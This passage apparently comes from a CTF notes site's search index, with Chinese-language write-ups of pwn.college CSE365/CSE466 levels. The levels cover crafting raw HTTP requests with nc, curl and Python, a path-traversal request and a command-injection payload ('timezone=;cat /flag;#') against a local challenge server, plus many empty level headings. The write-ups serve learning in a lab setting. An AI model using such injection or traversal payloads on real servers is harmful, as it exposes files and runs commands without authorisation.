close\\r\\n\\r\\n' | nc 127.0.0.1 80","title":"level35"},{"location":"en/CSE365/talking-web/#level36","text":"Include a cookie from HTTP response using python \u8c8c\u4f3c\u9898\u6709\u70b9\u513f\u6bdb\u75c5\u554a\u3002\u3002\u3002 import requests url = 'http://127.0.0.1' cookies = {'cookie_name': 'cookie_value'} response = requests.get(url, cookies=cookies) print(response.text)","title":"level36"},{"location":"en/CSE365/talking-web/#level37","text":"Include a cookie from HTTP response using curl curl -c cookies.txt http://127.0.0.1 curl -b cookies.txt -L -v http://127.0.0.1","title":"level37"},{"location":"en/CSE365/talking-web/#level38","text":"Include a cookie from HTTP response using nc \u597d\u5427\u8fd9\u4e2a\u73a9\u610f\u513f\uff0c\u5c31\u662f\u91cd\u590d\u8fd0\u884c\u51e0\u904d\uff0c\u5c31\u884c\u4e86\uff0c\u5e94\u8be5\u5199\u4e2a\u811a\u672c\u3002\u3002\u3002 \u6211TM\u624b\u52a8\u8f93\u4e86\u597d\u51e0\u904d\uff0c\u6211\u65e5\u3002\u3002\u3002 printf 'GET / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nCookie: session=eyJzdGF0ZSI6MX0.ZLMdXw.VU5O3fTNhAgzX_0GG5B3kRNVZ0M\\r\\nConnection: close\\r\\n\\r\\n' | nc 127.0.0.1 80 printf 'GET / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nCookie: session=eyJzdGF0ZSI6Mn0.ZLMdcQ.Ip32pWs2LPaq23ckcO5TQSjN5Us\\r\\nConnection: close\\r\\n\\r\\n' | nc 127.0.0.1 80 printf 'GET / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nCookie: session=eyJzdGF0ZSI6M30.ZLMdjQ.3QXprUl27h0da-RC0xjx1ZwrLZ0\\r\\nConnection: close\\r\\n\\r\\n' | nc 127.0.0.1 80","title":"level38"},{"location":"en/CSE365/talking-web/#level39","text":"Include a cookie from HTTP response using python \u8c8c\u4f3c\u786e\u5b9e\u6709\u6bdb\u75c5\u4e86 import requests url = 'http://127.0.0.1' cookies = {'cookie_name': 'cookie_value'} response = requests.get(url, cookies=cookies) print(response.text) \u788e\u788e\u5ff5\uff0c\u8fd9\u4e2anc\u662f\u771f\u7684\u96be\u7528\uff0c\u8fd8\u662fpython\u597d\u7528","title":"level39"},{"location":"en/CSE365/websecurity/","text":"Knoeledge \u9700\u8981\u77e5\u9053web\u670d\u52a1\u5668\u90fd\u80fd\u5e72\u4ec0\u4e48\u4e8b SQL\uff0c\u5927\u540d\u9f0e\u9f0e\u7684SQL\u6ce8\u5165 \u547d\u4ee4\u6ce8\u5165 HTML\uff0c\u4e5f\u5c31\u662f\u6ce8\u5165\u90e8\u5206JavaScript C\u8bed\u8a00\u7684\u5806\u6808\u6ce8\u5165 \u603b\u7684\u6765\u8bf4\u5c31\u662f\u5229\u7528Web\u670d\u52a1\u5668\u4f1a\u6267\u884c\u4e00\u4e9b\u8bed\u53e5\uff08\u90e8\u5206\u53c2\u6570\u6765\u81ea\u4e8e\u6211\u4eec\u7684\u8f93\u5165\uff09\uff0c\u6765\u8fdb\u884c\u64cd\u4f5c\u3002 Origin\u7684\u6982\u5ff5\uff1a( , , ) \uff08http, exapmle.com,80\uff09 HTML-embeds\u3001\u57df\u540d\u3001\u7ad9\u70b9\u7b49\u6982\u5ff5\uff0c\u57fa\u672c\u4e0a\u90fd\u662f\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u5185\u5bb9 WP level1 Exploit a path traversal vulnerability \u8fd9\u4e2a\u5176\u5b9e\u6211\u627e\u4e0d\u5230\u592a\u597d\u7684\u65b9\u6cd5\uff0c\u53ea\u80fd\u731c\uff0c\u731c\u5230\u4e86\u5c31\u662f\u4e86 hacker@web-security-level-1:~$ curl http://challenge.localhost:80/?path=/flag pwn.college{4MSrtxHJYUF2_wAz81iNV6UtM5K.ddDOzMDL2QjMyMzW} hacker@web-security-level-1:~$ level2 Exploit a command injection vulnerability \u8fd9\u4e2a\u5341\u5206\u7b80\u5355\uff0c\u5c31\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u547d\u4ee4\u6ce8\u5165\uff0c\u53ea\u9700\u8981\u8ba9\u524d\u9762\u7684\u547d\u4ee4\u95ed\u5408\u5373\u53ef hacker@web-security-level-2:~$ curl \"http://challenge.localhost:80/?timezone=;cat%20/flag;#\" pwn.college{o0h_efJ2CAv60AmeSOoPYGrZKBs.dhDOzMDL2QjMyMzW} Mon Jul 24 07:17:20 UTC 2023 level3 Exploit an authentication bypass vulnerability level4 Exploit a structured query language injection vulnerability to login level5 Exploit a structured query language injection vulnerability to leak data level6 Exploit a structured query language injection vulnerability with an unknown database structure level7 Exploit a structured query language injection vulnerability to blindly leak data level8 Exploit a cross site scripting vulnerability level9 Exploit a cross site scripting vulnerability with more complicated context level10 Exploit a cross site scripting vulnerability to cause a user action level11 Exploit a cross site request forgery vulnerability level12 Exploit a cross site request forgery vulnerability where the request must POST level13 Exploit a cross site scripting vulnerability to exfilitrate user session data level14 Exploit a cross site scripting vulnerability to exfilitrate user data level15 Exploit a (memory corruption) stack injection vulnerability","title":"websecurity"},{"location":"en/CSE365/websecurity/#knoeledge","text":"\u9700\u8981\u77e5\u9053web\u670d\u52a1\u5668\u90fd\u80fd\u5e72\u4ec0\u4e48\u4e8b SQL\uff0c\u5927\u540d\u9f0e\u9f0e\u7684SQL\u6ce8\u5165 \u547d\u4ee4\u6ce8\u5165 HTML\uff0c\u4e5f\u5c31\u662f\u6ce8\u5165\u90e8\u5206JavaScript C\u8bed\u8a00\u7684\u5806\u6808\u6ce8\u5165 \u603b\u7684\u6765\u8bf4\u5c31\u662f\u5229\u7528Web\u670d\u52a1\u5668\u4f1a\u6267\u884c\u4e00\u4e9b\u8bed\u53e5\uff08\u90e8\u5206\u53c2\u6570\u6765\u81ea\u4e8e\u6211\u4eec\u7684\u8f93\u5165\uff09\uff0c\u6765\u8fdb\u884c\u64cd\u4f5c\u3002 Origin\u7684\u6982\u5ff5\uff1a( , , ) \uff08http, exapmle.com,80\uff09 HTML-embeds\u3001\u57df\u540d\u3001\u7ad9\u70b9\u7b49\u6982\u5ff5\uff0c\u57fa\u672c\u4e0a\u90fd\u662f\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u5185\u5bb9","title":"Knoeledge"},{"location":"en/CSE365/websecurity/#wp","text":"","title":"WP"},{"location":"en/CSE365/websecurity/#level1-exploit-a-path-traversal-vulnerability","text":"\u8fd9\u4e2a\u5176\u5b9e\u6211\u627e\u4e0d\u5230\u592a\u597d\u7684\u65b9\u6cd5\uff0c\u53ea\u80fd\u731c\uff0c\u731c\u5230\u4e86\u5c31\u662f\u4e86 hacker@web-security-level-1:~$ curl http://challenge.localhost:80/?path=/flag pwn.college{4MSrtxHJYUF2_wAz81iNV6UtM5K.ddDOzMDL2QjMyMzW} hacker@web-security-level-1:~$","title":"level1 Exploit a path traversal vulnerability"},{"location":"en/CSE365/websecurity/#level2-exploit-a-command-injection-vulnerability","text":"\u8fd9\u4e2a\u5341\u5206\u7b80\u5355\uff0c\u5c31\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u547d\u4ee4\u6ce8\u5165\uff0c\u53ea\u9700\u8981\u8ba9\u524d\u9762\u7684\u547d\u4ee4\u95ed\u5408\u5373\u53ef hacker@web-security-level-2:~$ curl \"http://challenge.localhost:80/?timezone=;cat%20/flag;#\" pwn.college{o0h_efJ2CAv60AmeSOoPYGrZKBs.dhDOzMDL2QjMyMzW} Mon Jul 24 07:17:20 UTC 2023","title":"level2 Exploit a command injection vulnerability"},{"location":"en/CSE365/websecurity/#level3-exploit-an-authentication-bypass-vulnerability","text":"","title":"level3 Exploit an authentication bypass vulnerability"},{"location":"en/CSE365/websecurity/#level4-exploit-a-structured-query-language-injection-vulnerability-to-login","text":"","title":"level4 Exploit a structured query language injection vulnerability to login"},{"location":"en/CSE365/websecurity/#level5-exploit-a-structured-query-language-injection-vulnerability-to-leak-data","text":"","title":"level5 Exploit a structured query language injection vulnerability to leak data"},{"location":"en/CSE365/websecurity/#level6-exploit-a-structured-query-language-injection-vulnerability-with-an-unknown-database-structure","text":"","title":"level6 Exploit a structured query language injection vulnerability with an unknown database structure"},{"location":"en/CSE365/websecurity/#level7-exploit-a-structured-query-language-injection-vulnerability-to-blindly-leak-data","text":"","title":"level7 Exploit a structured query language injection vulnerability to blindly leak data"},{"location":"en/CSE365/websecurity/#level8-exploit-a-cross-site-scripting-vulnerability","text":"","title":"level8 Exploit a cross site scripting vulnerability"},{"location":"en/CSE365/websecurity/#level9-exploit-a-cross-site-scripting-vulnerability-with-more-complicated-context","text":"","title":"level9 Exploit a cross site scripting vulnerability with more complicated context"},{"location":"en/CSE365/websecurity/#level10-exploit-a-cross-site-scripting-vulnerability-to-cause-a-user-action","text":"","title":"level10 Exploit a cross site scripting vulnerability to cause a user action"},{"location":"en/CSE365/websecurity/#level11-exploit-a-cross-site-request-forgery-vulnerability","text":"","title":"level11 Exploit a cross site request forgery vulnerability"},{"location":"en/CSE365/websecurity/#level12-exploit-a-cross-site-request-forgery-vulnerability-where-the-request-must-post","text":"","title":"level12 Exploit a cross site request forgery vulnerability where the request must POST"},{"location":"en/CSE365/websecurity/#level13-exploit-a-cross-site-scripting-vulnerability-to-exfilitrate-user-session-data","text":"","title":"level13 Exploit a cross site scripting vulnerability to exfilitrate user session data"},{"location":"en/CSE365/websecurity/#level14-exploit-a-cross-site-scripting-vulnerability-to-exfilitrate-user-data","text":"","title":"level14 Exploit a cross site scripting vulnerability to exfilitrate user data"},{"location":"en/CSE365/websecurity/#level15-exploit-a-memory-corruption-stack-injection-vulnerability","text":"","title":"level15 Exploit a (memory corruption) stack injection vulnerability"},{"location":"en/CSE466/","text":"CSE466 fall22 \u6a21\u5757\u603b\u7ed3 program misuse \u8fd9\u4e2a\u6a21\u5757\u6bd4\u8f83\u57fa\u7840\uff0c\u5927\u90e8\u5206\u662f\u8ba9\u4f60\u8ba4\u8bc6linux\u4e0b\u7684\u5404\u79cd\u5de5\u5177\u3002\u5bf9\u65b0\u4eba\uff08\u6307\u81f3\u5c11\u719f\u6089\u5176\u4e2d\u90e8\u5206\u5de5\u5177\u4f46\u6ca1\u63a5\u89e6\u8fc7CTF\u7684\u4eba\uff09\u6765\u8bf4\u5e94\u8be5\u542f\u53d1\u5f88\u5927\uff0c\u5f88\u591a\u5de5\u5177\u867d\u7136\u8bbe\u8ba1\u51fa\u6765\u5e76\u4e0d\u662f\u4e3a\u4e86\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\uff0c\u4f46\u662f\u7531\u4e8e\u5176\u652f\u6301\u8c03\u8bd5\u3001\u8f93\u51fa\u9519\u8bef\u4fe1\u606f\u3001\u751a\u81f3\u662f\u8c03\u7528\u5176\u4ed6\u7a0b\u5e8f\u7b49\u79cd\u79cd\u8fd0\u884c\u65b9\u5f0f\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u65b9\u6cd5\u5f97\u5230\u6587\u4ef6\u5185\u5bb9\u3002\u5176\u5b9e\u6211\u8ba4\u4e3a\u8fd9\u662f\u8ba9\u4f60\u5173\u6ce8\u90a3\u4e9b\u5de5\u5177\u4e0d\u5e38\u7528\u7684\u529f\u80fd\uff0c\u6bd4\u5982\u6211\u4e00\u76f4\u5728\u4f7f\u7528tldr\uff0c\u4f46tldr\u4e4b\u4e2d\u6ca1\u6709\u4e0d\u5e38\u7528\u7684\u53c2\u6570\uff0c\u56e0\u6b64\u505a\u4e86\u51e0\u4e2a\u9898\u4ee5\u540e\u5c31\u4e0d\u592a\u9002\u5408\u8fd9\u4e2a\u6311\u6218\u4e86\u3002\u540c\u65f6\uff0c\u4f5c\u4e3aCTF\u4eba\uff0c\u5e94\u8be5\u5bf9\u6743\u9650\u5f88\u654f\u611f\uff0c\u5728\u4e00\u4e2a\u5de5\u5177\u6709suid\u7684\u60c5\u51b5\u4e0b\uff0c\u6df1\u6316\u8fd9\u4e2a\u5de5\u5177\u3002\u6211\u60f3\u8fd9\u5c31\u662f\u8fd9\u4e2a\u6a21\u5757\u6240\u80fd\u5e26\u6765\u7684\u542f\u53d1\u4e86\u3002 \u8bb2\u89e3 YOUTUBE\u4e0apwn college\u4e0a\u4f20\u4e86\u8001\u5e08\u7684\u8bb2\u89e3\uff0c\u5927\u591a\u6570\u5f88\u7ec6\u81f4\uff0c\u5c11\u90e8\u5206\u6ca1\u6709\u5b8c\u6210\u7ed9\u51fa\u8fc7\u7a0b\uff0c\u4f46\u90fd\u6709\u601d\u8def\uff0c\u9700\u8981\u81ea\u5df1\u53bb\u5b9e\u73b0\u3002\u5176\u5b9e\u5728\u5b9e\u73b0\u4e86\u4e4b\u540e\u53d1\u73b0\u4e5f\u5c31\u662f\u8fd9\u4e48\u56de\u4e8b\u513f\uff0c\u4f46\u662f\u601d\u8003\u7684\u8fc7\u7a0b\u6709\u65f6\u5019\u662f\u75db\u82e6\u7684\u3002 \u6211\u53c2\u8003\u8fc7\u7684\u6240\u6709\u94fe\u63a5 \u4e00\u4e2a\u535a\u4e3b \u4e00\u4e2a\u505a\u4e86\u4e0d\u5c11\u7684\u540c\u5b66 \u4e00\u4e2a\u4e0d\u7b97\u7279\u522b\u5177\u4f53\u7684wp \u6709\u4e00\u70b9\u70b9 \u4e5f\u4e0d\u592a\u591a \u4e00\u4e2a\u8001\u54e5\u8bb0\u5f55\u7684\u81ea\u5df1\u4e0d\u4f1a\u7684\u9898\uff0c\u65e0\u5177\u4f53wp \u53ea\u6709babyshell \u90e8\u5206\u9898\u89e3 \u4e00\u4e2a\u795e\u5947\u7684\u8001\u54e5\uff0c\u5168\u662f\u7b14\u8bb0\uff0c\u6ca1\u6709wp \u5fae\u4fe1\u516c\u4f17\u53f7\u6587\u7ae0\uff0c\u53ea\u6709misuse\u90e8\u5206 \u5f88\u591a\u9898\uff0c\u4e0d\u540c\u4eba\u7684\u89e3\u6cd5\u771f\u662f\u4e0d\u4e00\u6837\uff0c\u53ef\u4ee5\u591a\u770b\u770b\uff0c\u53c2\u8003\u7740\u505a\uff0c\u4f1a\u6709\u542f\u53d1\u7684\u3002","title":"ABOUT CSE466"},{"location":"en/CSE466/#cse466","text":"fall22","title":"CSE466"},{"location":"en/CSE466/#_1","text":"","title":"\u6a21\u5757\u603b\u7ed3"},{"location":"en/CSE466/#program-misuse","text":"\u8fd9\u4e2a\u6a21\u5757\u6bd4\u8f83\u57fa\u7840\uff0c\u5927\u90e8\u5206\u662f\u8ba9\u4f60\u8ba4\u8bc6linux\u4e0b\u7684\u5404\u79cd\u5de5\u5177\u3002\u5bf9\u65b0\u4eba\uff08\u6307\u81f3\u5c11\u719f\u6089\u5176\u4e2d\u90e8\u5206\u5de5\u5177\u4f46\u6ca1\u63a5\u89e6\u8fc7CTF\u7684\u4eba\uff09\u6765\u8bf4\u5e94\u8be5\u542f\u53d1\u5f88\u5927\uff0c\u5f88\u591a\u5de5\u5177\u867d\u7136\u8bbe\u8ba1\u51fa\u6765\u5e76\u4e0d\u662f\u4e3a\u4e86\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\uff0c\u4f46\u662f\u7531\u4e8e\u5176\u652f\u6301\u8c03\u8bd5\u3001\u8f93\u51fa\u9519\u8bef\u4fe1\u606f\u3001\u751a\u81f3\u662f\u8c03\u7528\u5176\u4ed6\u7a0b\u5e8f\u7b49\u79cd\u79cd\u8fd0\u884c\u65b9\u5f0f\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u65b9\u6cd5\u5f97\u5230\u6587\u4ef6\u5185\u5bb9\u3002\u5176\u5b9e\u6211\u8ba4\u4e3a\u8fd9\u662f\u8ba9\u4f60\u5173\u6ce8\u90a3\u4e9b\u5de5\u5177\u4e0d\u5e38\u7528\u7684\u529f\u80fd\uff0c\u6bd4\u5982\u6211\u4e00\u76f4\u5728\u4f7f\u7528tldr\uff0c\u4f46tldr\u4e4b\u4e2d\u6ca1\u6709\u4e0d\u5e38\u7528\u7684\u53c2\u6570\uff0c\u56e0\u6b64\u505a\u4e86\u51e0\u4e2a\u9898\u4ee5\u540e\u5c31\u4e0d\u592a\u9002\u5408\u8fd9\u4e2a\u6311\u6218\u4e86\u3002\u540c\u65f6\uff0c\u4f5c\u4e3aCTF\u4eba\uff0c\u5e94\u8be5\u5bf9\u6743\u9650\u5f88\u654f\u611f\uff0c\u5728\u4e00\u4e2a\u5de5\u5177\u6709suid\u7684\u60c5\u51b5\u4e0b\uff0c\u6df1\u6316\u8fd9\u4e2a\u5de5\u5177\u3002\u6211\u60f3\u8fd9\u5c31\u662f\u8fd9\u4e2a\u6a21\u5757\u6240\u80fd\u5e26\u6765\u7684\u542f\u53d1\u4e86\u3002","title":"program misuse"},{"location":"en/CSE466/#_2","text":"YOUTUBE\u4e0apwn college\u4e0a\u4f20\u4e86\u8001\u5e08\u7684\u8bb2\u89e3\uff0c\u5927\u591a\u6570\u5f88\u7ec6\u81f4\uff0c\u5c11\u90e8\u5206\u6ca1\u6709\u5b8c\u6210\u7ed9\u51fa\u8fc7\u7a0b\uff0c\u4f46\u90fd\u6709\u601d\u8def\uff0c\u9700\u8981\u81ea\u5df1\u53bb\u5b9e\u73b0\u3002\u5176\u5b9e\u5728\u5b9e\u73b0\u4e86\u4e4b\u540e\u53d1\u73b0\u4e5f\u5c31\u662f\u8fd9\u4e48\u56de\u4e8b\u513f\uff0c\u4f46\u662f\u601d\u8003\u7684\u8fc7\u7a0b\u6709\u65f6\u5019\u662f\u75db\u82e6\u7684\u3002","title":"\u8bb2\u89e3"},{"location":"en/CSE466/#_3","text":"\u4e00\u4e2a\u535a\u4e3b \u4e00\u4e2a\u505a\u4e86\u4e0d\u5c11\u7684\u540c\u5b66 \u4e00\u4e2a\u4e0d\u7b97\u7279\u522b\u5177\u4f53\u7684wp \u6709\u4e00\u70b9\u70b9 \u4e5f\u4e0d\u592a\u591a \u4e00\u4e2a\u8001\u54e5\u8bb0\u5f55\u7684\u81ea\u5df1\u4e0d\u4f1a\u7684\u9898\uff0c\u65e0\u5177\u4f53wp \u53ea\u6709babyshell \u90e8\u5206\u9898\u89e3 \u4e00\u4e2a\u795e\u5947\u7684\u8001\u54e5\uff0c\u5168\u662f\u7b14\u8bb0\uff0c\u6ca1\u6709wp \u5fae\u4fe1\u516c\u4f17\u53f7\u6587\u7ae0\uff0c\u53ea\u6709misuse\u90e8\u5206 \u5f88\u591a\u9898\uff0c\u4e0d\u540c\u4eba\u7684\u89e3\u6cd5\u771f\u662f\u4e0d\u4e00\u6837\uff0c\u53ef\u4ee5\u591a\u770b\u770b\uff0c\u53c2\u8003\u7740\u505a\uff0c\u4f1a\u6709\u542f\u53d1\u7684\u3002","title":"\u6211\u53c2\u8003\u8fc7\u7684\u6240\u6709\u94fe\u63a5"},{"location":"en/CSE466/program-interaction/","text":"Knowledge wp level1 hacker@program-interaction-level-1:~$ /challenge/embryoio_level1 WELCOME! This challenge makes the following asks of you: - the challenge checks for a specific parent process : bash ONWARDS TO GREATNESS! [INFO] This challenge will now perform a bunch of checks. [INFO] If you pass these checks, you will receive the flag. [TEST] Performing checks on the parent process of this process. [TEST] Checking to make sure the process is the bash shell. If this is a check for the parent process, then, [TEST] most likely, this is what you do by default anyways, but we'll check just in case... [INFO] The process' executable is /usr/bin/bash. [INFO] This might be different than expected because of symbolic links (for example, from /usr/bin/python to /usr/bin/python3 to /usr/bin/python3.8). [INFO] To pass the checks, the executable must be bash. [FAIL] You did not satisfy all the execution requirements. [FAIL] Specifically, you must fix the following issue: [FAIL] The shell process must be running in its default, interactive mode (/bin/bash with no commandline arguments). Your commandline arguments are: ['/bin/bash', '--init-file', '/usr/lib/code-server/lib/vscode/out/vs/workbench/contrib/terminal/browser/media/shellIntegration-bash.sh'] hacker@program-interaction-level-1:~$ level2 level3 level4 level5 level6 level7 level8 level9 level10 level11 level12 level13 level14 level15 level16 level17 level18 level19 level20 level21 level22 level23 level24 level25 level26 level27 level28 level29 level30 level31 level32 level33 level34 level35 level36 level37 level38 level39 level40 level41 level42 level43 level44 level45 level46 level47 level48 level49 level50 level51 level52 level53 level54 level55 level56 level57 level58 level59 level60 level61 level62 level63 level64 level65 level66 level67 level68 level70 level71 level72 level73 level74 level76 level77 level78 level79 level80 level82 level83 level84 level85 level86 level87 level88 level89 level90 level91 level92 level93 level94 level95 level96 level97 level98 level99 level100 level101 level102 level103 level104 level105 level106 level107 level108 level109 level110 level111 level112 level113 level114 level115 level116 level117 level118 level119 level120 level121 level122 level123 level124 level125 level126 level127 level128 level129 level130 level131 level132 level133 level134 level135 level136 level137 level138 level139 level140 level141 level142","title":"program interaction"},{"location":"en/CSE466/program-interaction/#knowledge","text":"","title":"Knowledge"},{"location":"en/CSE466/program-interaction/#wp","text":"","title":"wp"},{"location":"en/CSE466/program-interaction/#level1","text":"hacker@program-interaction-level-1:~$ /challenge/embryoio_level1 WELCOME! This challenge makes the following asks of you: - the challenge checks for a specific parent process : bash ONWARDS TO GREATNESS! [INFO] This challenge will now perform a bunch of checks. [INFO] If you pass these checks, you will receive the flag. [TEST] Performing checks on the parent process of this process. [TEST] Checking to make sure the process is the bash shell. If this is a check for the parent process, then, [TEST] most likely, this is what you do by default anyways, but we'll check just in case... [INFO] The process' executable is /usr/bin/bash. [INFO] This might be different than expected because of symbolic links (for example, from /usr/bin/python to /usr/bin/python3 to /usr/bin/python3.8). [INFO] To pass the checks, the executable must be bash. [FAIL] You did not satisfy all the execution requirements. [FAIL] Specifically, you must fix the following issue: [FAIL] The shell process must be running in its default, interactive mode (/bin/bash with no commandline arguments). Your commandline arguments are: ['/bin/bash', '--init-file', '/usr/lib/code-server/lib/vscode/out/vs/workbench/contrib/terminal/browser/media/shellIntegration-bash.sh'] hacker@program-interaction-level-1:~$","title":"level1"},{"location":"en/CSE466/program-interaction/#level2","text":"","title":"level2"},{"location":"en/CSE466/program-interaction/#level3","text":"","title":"level3"},{"location":"en/CSE466/program-interaction/#level4","text":"","title":"level4"},{"location":"en/CSE466/program-interaction/#level5","text":"","title":"level5"},{"location":"en/CSE466/program-interaction/#level6","text":"","title":"level6"},{"location":"en/CSE466/program-interaction/#level7","text":"","title":"level7"},{"location":"en/CSE466/program-interaction/#level8","text":"","title":"level8"},{"location":"en/CSE466/program-interaction/#level9","text":"","title":"level9"},{"location":"en/CSE466/program-interaction/#level10","text":"","title":"level10"},{"location":"en/CSE466/program-interaction/#level11","text":"","title":"level11"},{"location":"en/CSE466/program-interaction/#level12","text":"","title":"level12"},{"location":"en/CSE466/program-interaction/#level13","text":"","title":"level13"},{"location":"en/CSE466/program-interaction/#level14","text":"","title":"level14"},{"location":"en/CSE466/program-interaction/#level15","text":"","title":"level15"},{"location":"en/CSE466/program-interaction/#level16","text":"","title":"level16"},{"location":"en/CSE466/program-interaction/#level17","text":"","title":"level17"},{"location":"en/CSE466/program-interaction/#level18","text":"","title":"level18"},{"location":"en/CSE466/program-interaction/#level19","text":"","title":"level19"},{"location":"en/CSE466/program-interaction/#level20","text":"","title":"level20"},{"location":"en/CSE466/program-interaction/#level21","text":"","title":"level21"},{"location":"en/CSE466/program-interaction/#level22","text":"","title":"level22"},{"location":"en/CSE466/program-interaction/#level23","text":"","title":"level23"},{"location":"en/CSE466/program-interaction/#level24","text":"","title":"level24"},{"location":"en/CSE466/program-interaction/#level25","text":"","title":"level25"},{"location":"en/CSE466/program-interaction/#level26","text":"","title":"level26"},{"location":"en/CSE466/program-interaction/#level27","text":"","title":"level27"},{"location":"en/CSE466/program-interaction/#level28","text":"","title":"level28"},{"location":"en/CSE466/program-interaction/#level29","text":"","title":"level29"},{"location":"en/CSE466/program-interaction/#level30","text":"","title":"level30"},{"location":"en/CSE466/program-interaction/#level31","text":"","title":"level31"},{"location":"en/CSE466/program-interaction/#level32","text":"","title":"level32"},{"location":"en/CSE466/program-interaction/#level33","text":"","title":"level33"},{"location":"en/CSE466/program-interaction/#level34","text":"","title":"level34"},{"location":"en/CSE466/program-interaction/#level35","text":"","title":"level35"},{"location":"en/CSE466/program-interaction/#level36","text":"","title":"level36"},{"location":"en/CSE466/program-interaction/#level37","text":"","title":"level37"},{"location":"en/CSE466/program-interaction/#level38","text":"","title":"level38"},{"location":"en/CSE466/program-interaction/#level39","text":"","title":"level39"},{"location":"en/CSE466/program-interaction/#level40","text":"","title":"level40"},{"location":"en/CSE466/program-interaction/#level41","text":"","title":"level41"},{"location":"en/CSE466/program-interaction/#level42","text":"","title":"level42"},{"location":"en/CSE466/program-interaction/#level43","text":"","title":"level43"},{"location":"en/CSE466/program-interaction/#level44","text":"","title":"level44"},{"location":"en/CSE466/program-interaction/#level45","text":"","title":"level45"},{"location":"en/CSE466/program-interaction/#level46","text":"","title":"level46"},{"location":"en/CSE466/program-interaction/#level47","text":"","title":"level47"},{"location":"en/CSE466/program-interaction/#level48","text":"","title":"level48"},{"location":"en/CSE466/program-interaction/#level49","text":"","title":"level49"},{"location":"en/CSE466/program-interaction/#level50","text":"","title":"level50"},{"location":"en/CSE466/program-interaction/#level51","text":"","title":"level51"},{"location":"en/CSE466/program-interaction/#level52","text":"","title":"level52"},{"location":"en/CSE466/program-interaction/#level53","text":"","title":"level53"},{"location":"en/CSE466/program-interaction/#level54","text":"","title":"level54"},{"location":"en/CSE466/program-interaction/#level55","text":"","title":"level55"},{"location":"en/CSE466/program-interaction/#level56","text":"","title":"level56"},{"location":"en/CSE466/program-interaction/#level57","text":"","title":"level57"},{"location":"en/CSE466/program-interaction/#level58","text":"","title":"level58"},{"location":"en/CSE466/program-interaction/#level59","text":"","title":"level59"},{"location":"en/CSE466/program-interaction/#level60","text":"","title":"level60"},{"location":"en/CSE466/program-interaction/#level61","text":"","title":"level61"},{"location":"en/CSE466/program-interaction/#level62","text":"","title":"level62"},{"location":"en/CSE466/program-interaction/#level63","text":"","title":"level63"},{"location":"en/CSE466/program-interaction/#level64","text":"","title":"level64"},{"location":"en/CSE466/program-interaction/#level65","text":"","title":"level65"},{"location":"en/CSE466/program-interaction/#level66","text":"","title":"level66"},{"location":"en/CSE466/program-interaction/#level67","text":"","title":"level67"},{"location":"en/CSE466/program-interaction/#level68","text":"","title":"level68"},{"location":"en/CSE466/program-interaction/#level70","text":"","title":"level70"},{"location":"en/CSE466/program-interaction/#level71","text":"","title":"level71"},{"location":"en/CSE466/program-interaction/#level72","text":"","title":"level72"},{"location":"en/CSE466/program-interaction/#level73","text":"","title":"level73"},{"location":"en/CSE466/program-interaction/#level74","text":"","title":"level74"},{"location":"en/CSE466/program-interaction/#level76","text":"","title":"level76"},{"location":"en/CSE466/program-interaction/#level77","text":"","title":"level77"},{"location":"en/CSE466/program-interaction/#level78","text":"","title":"level78"},{"location":"en/CSE466/program-interaction/#level79","text":"","title":"level79"},{"location":"en/CSE466/program-interaction/#level80","text":"","title":"level80"},{"location":"en/CSE466/program-interaction/#level82","text":"","title":"level82"},{"location":"en/CSE466/program-interaction/#level83","text":"","title":"level83"},{"location":"en/CSE466/program-interaction/#level84","text":"","title":"level84"},{"location":"en/CSE466/program-interaction/#level85","text":"","title":"level85"},{"location":"en/CSE466/program-interaction/#level86","text":"","title":"level86"},{"location":"en/CSE466/program-interaction/#level87","text":"","title":"level87"},{"location":"en/CSE466/program-interaction/#level88","text":"","title":"level88"},{"location":"en/CSE466/program-interaction/#level89","text":"","title":"level89"},{"location":"en/CSE466/program-interaction/#level90","text":"","title":"level90"},{"location":"en/CSE466/program-interaction/#level91","text":"","title":"level91"},{"location":"en/CSE466/program-interaction/#level92","text":"","title":"level92"},{"location":"en/CSE466/program-interaction/#level93","text":"","title":"level93"},{"location":"en/CSE466/program-interaction/#level94","text":"","title":"level94"},{"location":"en/CSE466/program-interaction/#level95","text":"","title":"level95"},{"location":"en/CSE466/program-interaction/#level96","text":"","title":"level96"},{"location":"en/CSE466/program-interaction/#level97","text":"","title":"level97"},{"location":"en/CSE466/program-interaction/#level98","text":"","title":"level98"},{"location":"en/CSE466/program-interaction/#level99","text":"","title":"level99"},{"location":"en/CSE466/program-interaction/#level100","text":"","title":"level100"},{"location":"en/CSE466/program-interaction/#level101","text":"","title":"level101"},{"location":"en/CSE466/program-interaction/#level102","text":"","title":"level102"},{"location":"en/CSE466/program-interaction/#level103","text":"","title":"level103"},{"location":"en/CSE466/program-interaction/#level104","text":"","title":"level104"},{"location":"en/CSE466/program-interaction/#level105","text":"","title":"level105"},{"location":"en/CSE466/program-interaction/#level106","text":"","title":"level106"},{"location":"en/CSE466/program-interaction/#level107","text":"","title":"level107"},{"location":"en/CSE466/program-interaction/#level108","text":"","title":"level108"},{"location":"en/CSE466/program-interaction/#level109","text":"","title":"level109"},{"location":"en/CSE466/program-interaction/#level110","text":"","title":"level110"},{"location":"en/CSE466/program-interaction/#level111","text":"","title":"level111"},{"location":"en/CSE466/program-interaction/#level112","text":"","title":"level112"},{"location":"en/CSE466/program-interaction/#level113","text":"","title":"level113"},{"location":"en/CSE466/program-interaction/#level114","text":"","title":"level114"},{"location":"en/CSE466/program-interaction/#level115","text":"","title":"level115"},{"location":"en/CSE466/program-interaction/#level116","text":"","title":"level116"},{"location":"en/CSE466/program-interaction/#level117","text":"","title":"level117"},{"location":"en/CSE466/program-interaction/#level118","text":"","title":"level118"},{"location":"en/CSE466/program-interaction/#level119","text":"","title":"level119"},{"location":"en/CSE466/program-interaction/#level120","text":"","title":"level120"},{"location":"en/CSE466/program-interaction/#level121","text":"","title":"level121"},{"location":"en/CSE466/program-interaction/#level122","text":"","title":"level122"},{"location":"en/CSE466/program-interaction/#level123","text":"","title":"level123"},{"location":"en/CSE466/program-interaction/#level124","text":"","title"